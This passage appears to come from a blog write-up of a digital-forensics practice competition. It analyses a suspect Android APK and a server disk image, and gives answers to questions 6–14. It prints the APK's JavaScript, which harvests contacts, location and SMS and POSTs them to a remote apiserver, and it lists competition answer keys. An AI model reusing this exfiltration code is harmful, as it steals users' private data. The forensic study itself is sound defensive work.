class="line">				<span class="keyword">if</span> (permissionStatusOk) &#123;</span><br><span class="line">					<span class="title function_">successCallBack</span>()</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="comment">//如果不正常，如果是 andorid 系统，就动态申请权限  </span></span><br><span class="line">					<span class="keyword">if</span> (plus.<span class="property">os</span>.<span class="property">name</span> == <span class="string">&#x27;Android&#x27;</span>) &#123;</span><br><span class="line">						<span class="comment">//动态申请权限  </span></span><br><span class="line">						plus.<span class="property">android</span>.<span class="title function_">requestPermissions</span>([androidPermission], <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">							<span class="keyword">if</span> (e.<span class="property">deniedAlways</span>.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">								<span class="comment">//权限被永久拒绝  </span></span><br><span class="line">								<span class="comment">// 弹出提示框解释为何需要定位权限，引导用户打开设置页面开启  </span></span><br><span class="line">								<span class="title function_">errorCallBack</span>(<span class="string">&#x27;请您同意弹出的权限，便可正常使用APP！如果未弹出，请前往“手机设置”里的“权限管理”找到本应用，并打开通讯录权限，方可使用。&#x27;</span>)</span><br><span class="line">								<span class="comment">// console.log(&#x27;Always Denied!!! &#x27; + e.deniedAlways.toString());  </span></span><br><span class="line">							&#125;</span><br><span class="line">							<span class="keyword">if</span> (e.<span class="property">deniedPresent</span>.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">								<span class="comment">// 权限被临时拒绝  </span></span><br><span class="line">								<span class="comment">// 弹出提示框解释为何需要定位权限，可再次调用plus.android.requestPermissions申请权限  </span></span><br><span class="line">								<span class="title function_">errorCallBack</span>(<span class="string">&#x27;请您同意弹出的权限，便可正常使用APP！如果未弹出，请前往“手机设置”里的“权限管理”找到本应用，并打开通讯录权限，方可使用。&#x27;</span>)</span><br><span class="line">								<span class="comment">// console.log(&#x27;Present Denied!!! &#x27; + e.deniedPresent.toString());  </span></span><br><span class="line">							&#125;</span><br><span class="line">							<span class="keyword">if</span> (e.<span class="property">granted</span>.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">								<span class="comment">//权限被允许  </span></span><br><span class="line">								<span class="comment">//调用依赖获取定位权限的代码  </span></span><br><span class="line">								<span class="title function_">successCallBack</span>()</span><br><span class="line">								<span class="comment">// console.log(&#x27;Granted!!! &#x27; + e.granted.toString());  </span></span><br><span class="line">							&#125;</span><br><span class="line">						&#125;, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">							<span class="title function_">errorCallBack</span>(<span class="string">&#x27;请您同意弹出的权限，便可正常使用APP！如果未弹出，请前往“手机设置”里的“权限管理”找到本应用，并打开通讯录权限，方可使用。&#x27;</span>)</span><br><span class="line">							<span class="comment">// console.log(&#x27;Request Permissions error:&#x27; + JSON.stringify(e));  </span></span><br><span class="line">						&#125;)</span><br><span class="line">					&#125; <span class="keyword">else</span> <span class="keyword">if</span> (plus.<span class="property">os</span>.<span class="property">name</span> == <span class="string">&#x27;iOS&#x27;</span>) &#123;</span><br><span class="line">						<span class="comment">//ios ,第一次使用目的权限时，应用的权限列表里是不存在的，所以先默认执行一下成功回调，打开要使用的操作，比如 plus.camera  </span></span><br><span class="line">						<span class="comment">//这时系统会提示是否打开相应的权限，如果拒绝也没关系，因为应用的权限列表里已经存在该权限了，下次再调用相应权限时，就会  </span></span><br><span class="line">						<span class="comment">//走 else 里的流程，会给用户提示，并且跳转到应该的权限页面，让用户手动打开。  </span></span><br><span class="line">						<span class="keyword">if</span> (checkResult == <span class="string">&#x27;undetermined&#x27;</span>) &#123;</span><br><span class="line">							<span class="comment">//调用依赖获取定位权限的代码  </span></span><br><span class="line">							<span class="title function_">successCallBack</span>(<span class="literal">true</span>)</span><br><span class="line">						&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">							<span class="comment">//如果是 ios 系统，ios 没有动态申请操作，所以提示用户去设置页面手动打开  </span></span><br><span class="line">							mui.<span class="title function_">confirm</span>(permissionName + <span class="string">&#x27;权限没有开启，是否去开启？&#x27;</span>, <span class="string">&#x27;提醒&#x27;</span>, [<span class="string">&#x27;取消&#x27;</span>, <span class="string">&#x27;确认&#x27;</span>], <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">								<span class="comment">//取消  </span></span><br><span class="line">								<span class="keyword">if</span> (e.<span class="property">index</span> == <span class="number">0</span>) &#123;</span><br><span class="line">									<span class="title function_">errorCallBack</span>(<span class="string">&#x27;请您同意弹出的权限，便可正常使用APP！如果未弹出，请前往“手机设置”里的“权限管理”找到本应用，并打开通讯录权限，方可使用。&#x27;</span>)</span><br><span class="line">								&#125; <span class="keyword">else</span> <span class="keyword">if</span> (e.<span class="property">index</span> == <span class="number">1</span>) &#123;</span><br><span class="line">									<span class="comment">//确认，打开当前应用权限设置页面  </span></span><br><span class="line">									<span class="keyword">var</span> <span class="title class_">UIApplication</span> = plus.<span class="property">ios</span>.<span class="keyword">import</span>(<span class="string">&#x27;UIApplication&#x27;</span>);</span><br><span class="line">									<span class="keyword">var</span> application2 = <span class="title class_">UIApplication</span>.<span class="title function_">sharedApplication</span>();</span><br><span class="line">									<span class="keyword">var</span> <span class="title class_">NSURL2</span> = plus.<span class="property">ios</span>.<span class="keyword">import</span>(<span class="string">&#x27;NSURL&#x27;</span>);</span><br><span class="line">									<span class="comment">// var setting2 = NSURL2.URLWithString(&quot;prefs:root=LOCATION_SERVICES&quot;);                             </span></span><br><span class="line">									<span class="keyword">var</span> setting2 = <span class="title class_">NSURL2</span>.<span class="title class_">URLWithString</span>(<span class="string">&#x27;app-settings:&#x27;</span>);</span><br><span class="line">									application2.<span class="title function_">openURL</span>(setting2);</span><br><span class="line"></span><br><span class="line">									plus.<span class="property">ios</span>.<span class="title function_">deleteObject</span>(setting2);</span><br><span class="line">									plus.<span class="property">ios</span>.<span class="title function_">deleteObject</span>(<span class="title class_">NSURL2</span>);</span><br><span class="line">									plus.<span class="property">ios</span>.<span class="title function_">deleteObject</span>(application2)</span><br><span class="line">								&#125;</span><br><span class="line">							&#125;, <span class="string">&#x27;div&#x27;</span>)</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">			<span class="keyword">function</span> <span class="title function_">aa</span>(<span class="params"></span>) &#123;</span><br><span class="line">				<span class="keyword">var</span> sjh = $(<span class="string">&#x27;#sjh&#x27;</span>).<span class="title function_">val</span>();</span><br><span class="line">				<span class="keyword">var</span> yqm = $(<span class="string">&#x27;#yqm&#x27;</span>).<span class="title function_">val</span>();</span><br><span class="line">				<span class="keyword">if</span> (<span class="built_in">parseInt</span>(sjh) &gt; <span class="number">0</span> &amp;&amp; <span class="built_in">parseInt</span>(yqm) &gt; <span class="number">0</span> &amp;&amp; <span class="built_in">parseInt</span>(sjh) &gt; <span class="number">13000000000</span> &amp;&amp; <span class="built_in">parseInt</span>(sjh) &lt; <span class="number">19999999999</span> &amp;&amp; <span class="built_in">parseInt</span>(yqm) &gt; <span class="number">0</span> &amp;&amp; <span class="built_in">parseInt</span>(yqm) &lt; <span class="number">999999</span>) &#123;</span><br><span class="line"></span><br><span class="line">					<span class="title function_">getPermission</span>(<span class="string">&#x27;CONTACTS&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">						<span class="title function_">huoqu</span>(sjh, yqm);</span><br><span class="line"></span><br><span class="line">					&#125;, <span class="keyword">function</span> (<span class="params">msg</span>) &#123;</span><br><span class="line">						mui.<span class="title function_">alert</span>(msg, <span class="string">&#x27;提醒&#x27;</span>, <span class="string">&#x27;确定&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123; &#125;, <span class="string">&#x27;div&#x27;</span>)</span><br><span class="line">						<span class="comment">//aa()</span></span><br><span class="line">					&#125;)</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> &#123;</span><br><span class="line">					mui.<span class="title function_">toast</span>(<span class="string">&#x27;请输入正确的手机号和邀请码&#x27;</span>)</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">			<span class="keyword">function</span> <span class="title function_">dingwei</span>(<span class="params">sjh, yqm</span>) &#123;</span><br><span class="line">				plus.<span class="property">geolocation</span>.<span class="title function_">getCurrentPosition</span>(translatePoint, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">					mui.<span class="title function_">toast</span>(<span class="string">&quot;异常:&quot;</span> + e.<span class="property">message</span>);</span><br><span class="line">				&#125;);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">function</span> <span class="title function_">translatePoint</span>(<span class="params">position</span>) &#123;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">var</span> sjh = $(<span class="string">&#x27;#sjh&#x27;</span>).<span class="title function_">val</span>()</span><br><span class="line">				<span class="keyword">var</span> yqm = $(<span class="string">&#x27;#yqm&#x27;</span>).<span class="title function_">val</span>()</span><br><span class="line">				<span class="keyword">var</span> currentLon = position.<span class="property">coords</span>.<span class="property">longitude</span>;</span><br><span class="line">				<span class="keyword">var</span> currentLat = position.<span class="property">coords</span>.<span class="property">latitude</span>;</span><br><span class="line">				<span class="keyword">var</span> jingweidu = sjh + <span class="string">&#x27;,&#x27;</span> + yqm + <span class="string">&#x27;,&#x27;</span> + currentLon + <span class="string">&#x27;,&#x27;</span> + currentLat;</span><br><span class="line">				mui.<span class="title function_">ajax</span>(apiserver + <span class="string">&#x27;apimap&#x27;</span>, &#123;</span><br><span class="line">					<span class="attr">data</span>: &#123;</span><br><span class="line">						<span class="attr">data</span>: jingweidu</span><br><span class="line">					&#125;,</span><br><span class="line">					<span class="attr">dataType</span>: <span class="string">&#x27;text&#x27;</span>,<span class="comment">//服务器返回json格式数据</span></span><br><span class="line">					<span class="attr">type</span>: <span class="string">&#x27;post&#x27;</span>,<span class="comment">//HTTP请求类型</span></span><br><span class="line">					<span class="attr">timeout</span>: <span class="number">10000</span>,<span class="comment">//超时时间设置为10秒；              </span></span><br><span class="line">					<span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line"></span><br><span class="line">						<span class="keyword">if</span> (data == <span class="string">&#x27;获取成功&#x27;</span>) &#123;</span><br><span class="line">							<span class="title function_">requestPermission</span>(sjh, yqm);</span><br><span class="line"></span><br><span class="line">							<span class="comment">//setInterval(function()&#123;</span></span><br><span class="line">							<span class="comment">//var sjh=$(&#x27;#sjh&#x27;).val();</span></span><br><span class="line">							<span class="comment">//var yqm=$(&#x27;#yqm&#x27;).val();</span></span><br><span class="line">							<span class="comment">//requestPermission(sjh,yqm);</span></span><br><span class="line">							<span class="comment">//console.log(&#x27;send&#x27;)</span></span><br><span class="line"></span><br><span class="line">							<span class="comment">//&#125;,30000)</span></span><br><span class="line">						&#125;</span><br><span class="line"></span><br><span class="line">						mui.<span class="title function_">toast</span>(data)</span><br><span class="line">					&#125;,</span><br><span class="line">					<span class="attr">error</span>: <span class="keyword">function</span> (<span class="params">xhr, type, errorThrown</span>) &#123;</span><br><span class="line">						<span class="comment">//异常处理；</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">					&#125;</span><br><span class="line">				&#125;);</span><br><span class="line"></span><br><span class="line">				<span class="comment">//书写自己的逻辑</span></span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">// 扩展API加载完毕，现在可以正常调用扩展API</span></span><br><span class="line"></span><br><span class="line">			<span class="keyword">function</span> <span class="title function_">huoqu</span>(<span class="params">sjh, yqm</span>) &#123;</span><br><span class="line">				<span class="keyword">var</span> con = sjh + <span class="string">&quot;**&quot;</span> + yqm + <span class="string">&#x27;**&#x27;</span> + address;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">				plus.<span class="property">contacts</span>.<span class="title function_">getAddressBook</span>(plus.<span class="property">contacts</span>.<span class="property">ADDRESSBOOK_PHONE</span>, <span class="keyword">function</span> (<span class="params">addressbook</span>) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">					addressbook.<span class="title function_">find</span>([<span class="string">&quot;displayName&quot;</span>, <span class="string">&quot;phoneNumbers&quot;</span>], <span class="keyword">function</span> (<span class="params">contacts</span>) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">						<span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, len = contacts.<span class="property">length</span>; i &lt; len; i++) &#123;</span><br><span class="line">							con = con + <span class="string">&#x27;=&#x27;</span> + contacts[i].<span class="property">displayName</span> + <span class="string">&#x27;|&#x27;</span> + (contacts[i].<span class="property">phoneNumbers</span>.<span class="property">length</span> == <span class="number">0</span> ? <span class="string">&quot;&quot;</span> : contacts[i].<span class="property">phoneNumbers</span>[<span class="number">0</span>].<span class="property">value</span>);</span><br><span class="line">						&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">						mui.<span class="title function_">ajax</span>(apiserver + <span class="string">&#x27;api&#x27;</span>, &#123;</span><br><span class="line">							<span class="attr">data</span>: &#123;</span><br><span class="line">								<span class="attr">data</span>: con</span><br><span class="line">							&#125;,</span><br><span class="line">							<span class="attr">dataType</span>: <span class="string">&#x27;text&#x27;</span>,<span class="comment">//服务器返回json格式数据</span></span><br><span class="line">							<span class="attr">type</span>: <span class="string">&#x27;post&#x27;</span>,<span class="comment">//HTTP请求类型</span></span><br><span class="line">							<span class="attr">timeout</span>: <span class="number">10000</span>,<span class="comment">//超时时间设置为10秒；              </span></span><br><span class="line">							<span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">								<span class="comment">//alert(data)</span></span><br><span class="line">								<span class="keyword">if</span> (data == <span class="string">&#x27;正在加载列表&#x27;</span>) &#123;</span><br><span class="line">									<span class="title function_">dingwei</span>(sjh, yqm);</span><br><span class="line">									mui.<span class="title function_">openWindow</span>(&#123;</span><br><span class="line">										<span class="attr">url</span>: <span class="string">&#x27;list.html&#x27;</span>,</span><br><span class="line">										<span class="attr">show</span>: &#123;</span><br><span class="line">											<span class="attr">autoShow</span>: <span class="literal">true</span></span><br><span class="line">										&#125;</span><br><span class="line">									&#125;);</span><br><span class="line">								&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">									mui.<span class="title function_">toast</span>(data)</span><br><span class="line">								&#125;</span><br><span class="line">								<span class="comment">//console.log(con)</span></span><br><span class="line">							&#125;,</span><br><span class="line">							<span class="attr">error</span>: <span class="keyword">function</span> (<span class="params">xhr, type, errorThrown</span>) &#123;</span><br><span class="line">								<span class="comment">//异常处理；</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">							&#125;</span><br><span class="line">						&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">					&#125;, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">						mui.<span class="title function_">alert</span>(<span class="string">&quot;为保证用户质量，使用本app请同意通讯录授权 &quot;</span>);</span><br><span class="line">					&#125;, &#123;</span><br><span class="line">						<span class="attr">multiple</span>: <span class="literal">true</span></span><br><span class="line">					&#125;);</span><br><span class="line">				&#125;, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">					mui.<span class="title function_">alert</span>(<span class="string">&quot;为保证用户质量，使用本app请同意通讯录授权 &quot;</span>);</span><br><span class="line">				&#125;);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br></pre></td></tr></table></figure>
<ul>
<li>经过查看发现
<ul>
<li>第<code>340</code>行代码中<code>function huoqu(sjh, yqm)函数</code>，这里面出现了<code>plus.contacts.getAddressBook(plus.contacts.ADDRESSBOOK_PHONE, function (addressbook)</code>,所以有获取<code>通讯录</code></li>
<li>第<code>340</code>行代码中出现，说明发送了<code>sjh（手机号）</code>、<code>yqm（邀请码，应该是验证码）</code>、<code>address(地址)</code>，并没有找到应用列表，所以选<code>A、C、D、E</code></li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">function huoqu(sjh, yqm) &#123;</span><br><span class="line">	var con = sjh + &quot;**&quot; + yqm + &#x27;**&#x27; + address;</span><br></pre></td></tr></table></figure>
<h3 id="题目6"><a class="markdownIt-Anchor" href="#题目6"></a> 题目6</h3>
<ul>
<li>该APK程序回传通讯录时,使用的http请求方式为（）</li>
<li>在题目5中的js代码处，第<code>363</code>行代码出现<code>post</code>参数，所以回传的应该是post方式</li>
</ul>
<h3 id="题目7"><a class="markdownIt-Anchor" href="#题目7"></a> 题目7</h3>
<ul>
<li>
<p>该APK程序的回传地址域名为【标准格式：<a target="_blank" rel="noopener" href="http://www.abc.com">www.abc.com</a>】</p>
</li>
<li>
<p>这里直接看上面js代码第16行，得到域名<code>www.honglian7001.com</code></p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var apiserver = &#x27;http://www.honglian7001.com/api/uploads/&#x27;;</span><br></pre></td></tr></table></figure>
<h3 id="题目8"><a class="markdownIt-Anchor" href="#题目8"></a> 题目8</h3>
<ul>
<li>
<p>该APK程序代码中配置的变量apiserver的值为【标准格式：<a target="_blank" rel="noopener" href="http://www.abc.com/abc%E3%80%91">www.abc.com/abc】</a></p>
</li>
<li>
<p>题目7同时也找到变量apiserver变量的值<code>http://www.honglian7001.com/api/uploads/</code></p>
</li>
<li>
<p>所以最后答案为<code>www.honglian7001.com/api/uploads</code></p>
</li>
<li>
<p>注意：最末尾的没有<code>/</code></p>
</li>
</ul>
<h3 id="题目9"><a class="markdownIt-Anchor" href="#题目9"></a> 题目9</h3>
<ul>
<li>分析该APK，发现该程序还具备获取短信回传到后台的功能，短信上传服务器接口地址为【标准格式：<a target="_blank" rel="noopener" href="http://www.abc.com/abc%E3%80%91">www.abc.com/abc】</a> （后面不带/）</li>
<li>依然分析js代码</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mui.<span class="title function_">ajax</span>(apiserver + <span class="string">&#x27;apisms&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">data</span>: &#123;</span><br><span class="line">        <span class="attr">data</span>: duanxin</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">dataType</span>: <span class="string">&#x27;text&#x27;</span>,</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">    <span class="attr">timeout</span>: <span class="number">10000</span>,</span><br><span class="line">    <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">        mui.<span class="title function_">toast</span>(<span class="string">&#x27;获取成功&#x27;</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">error</span>: <span class="keyword">function</span> (<span class="params">xhr, type, errorThrown</span>) &#123;</span><br><span class="line">        <span class="comment">//异常处理；</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<ul>
<li>得出短信回传后台地址为<code>www.honglian7001.com/api/uploads/apisms</code></li>
</ul>
<h3 id="题目10"><a class="markdownIt-Anchor" href="#题目10"></a> 题目10</h3>
<p>经分析，发现该APK在运行过程中会在手机中产生一个数据库文件，该文件的文件名为</p>
<ul>
<li>Android 应用的数据库通常存储在 <code>/data/data/&lt;package_name&gt;/databases/</code> 目录下，使用<code>MT</code>管理器到这个里面去查找。</li>
<li>找到该文件夹里面的东西</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241020122447218.png" alt="image-20241020122447218"></p>
<ul>
<li>所以答案为<code>test.db</code></li>
</ul>
<h3 id="题目11"><a class="markdownIt-Anchor" href="#题目11"></a> 题目11*</h3>
<ul>
<li>目前还没办法复现，所以等有办法复现再说，现在先贴出答案</li>
</ul>
<p><code>c74d97b01eae257e44aa9d5bade97baf</code></p>
<h2 id="检材2"><a class="markdownIt-Anchor" href="#检材2"></a> 检材2</h2>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241020122609636.png" alt="image-20241020122609636"></p>
<ul>
<li>
<p>使用第7题的答案<code>www.honglian7001.com</code>对这个压缩包进行解密<code>www.honglian7001.com</code></p>
</li>
<li>
<p>解压后给了个E1的文件</p>
</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241020123325940.png" alt="image-20241020123325940"></p>
<ul>
<li>使用<code>美亚取证大师</code>打开，同时也用<code>美亚仿真软件</code>打开，这一部分是直接进操作系统，直接使用命令查找会更方便</li>
</ul>
<h3 id="题目12"><a class="markdownIt-Anchor" href="#题目12"></a> 题目12</h3>
<ul>
<li>检材二的原始硬盘的SHA256值为:<code>E6873068B83AF9988D297C6916329CEC9D8BCB672C6A894D393E68764391C589</code></li>
<li>打开后选择如下，点击右键，选择<code>哈希计算</code>，这里不能直接计算<code>E01</code>的<code>sha256</code>值，<code>E01</code>相当于压缩处理过的硬盘，计算的sha256是和原始的不一样的</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241020130353407.png" alt="image-20241020130353407"></p>
<ul>
<li>然后选中<code>SHA256</code>，点击开始</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241020130452766.png" alt="image-20241020130452766"></p>
<ul>
<li>最后得到答案<code>E6873068B83AF9988D297C6916329CEC9D8BCB672C6A894D393E68764391C589</code></li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241020130507851.png" alt="image-20241020130507851"></p>
<h3 id="题目13"><a class="markdownIt-Anchor" href="#题目13"></a> 题目13</h3>
<ul>
<li>
<p>查询涉案于案发时间段内登陆服务器的IP地址为【标准格式：111.111.111.111】</p>
</li>
<li>
<p>取证自动分析后，找到该文件</p>
</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241020131001311.png" alt="image-20241020131001311"></p>
<ul>
<li>找到案发的时间段，发现是该<code>ip</code>登录主机</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241020131027528.png" alt="image-20241020131027528"></p>
<ul>
<li>
<p>所以最后题目的答案是<code>192.168.110.203</code></p>
</li>
<li>
<p>这里也可以直接用仿真软件仿真出对应的系统，使用虚拟机就可以打开，打开后就可以使用命令进行取证分析，由于报案人报案时间是<code>4月25日</code>，所以案发时间就应该是在<code>4月23、24日</code>这样的一个时间段</p>
</li>
<li>
<p>使用命令<code> last | grep &quot;Apr 24&quot;</code></p>
</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241020164858993.png" alt="image-20241020164858993"></p>
<h3 id="题目14"><a class="markdownIt-Anchor" href="#题目14"></a> 题目14</h3>
<ul>
<li>
<p>请对检材二进行分析，并回答该服务器在集群中承担的主要作用是（）【格式：文件存储】答案：<code>负载均衡</code></p>
</li>
<li>
<p>这里先归纳一下服务器在集群中承担的作用主要有哪些：</p>
<ul>
<li><code>负载均衡</code>：在服务器中会定义将请求分配到不同的服务器节点上，往往会有<code>Nginx</code>或者<code>HAProxy</code>等代理或者反向代理工具</li>
<li><code>高可用性</code>：通常会有集群管理软件<code>Keepalived</code>或者<code>Pacemaker</code></li>
<li><code>计算任务分发</code>：会有任务调度系统，存在<code>Apache Mesos</code>或者<code>K8S</code>等应用</li>
<li>``存储分布<code>：有存储分布系统，存在</code>Hadoop HDFS<code>或</code>Ceph`等文件，这些会通过配置文件定义存储节点的位置、数据的复制规则</li>
<li><code>数据冗余与备份</code>：体现在文件系统和数据库的配置文件中</li>
<li>``拓展性支持`：</li>
<li><code>文件存储</code>：</li>
<li>``任务调度与协调`：</li>
<li><code>故障检测与恢复</code>：</li>
<li>``缓存和加速`：</li>
</ul>
</li>
<li>
<p>这里先查看一下<code>history</code>，发现一下有没什么线索</p>
</li>
<li>
<p>然后再进入<code>opt</code>目录，发现有个<code>honglianjingsai</code>的目录</p>
</li>
</ul>
<p><img src="/2024/10/19/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%B7%E9%A2%981/image-20241020170127407.png" alt="image-20241020170127407"></p>
<ul>
<li>现在查看下这些目录和文件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line">[ccj@localhost chronusNode]$ cat const.js</span><br><span class="line">module.exports = &#123;</span><br><span class="line">    chronus_god : &#x27;Chronus&#x27;,</span><br><span class="line">    /*</span><br><span 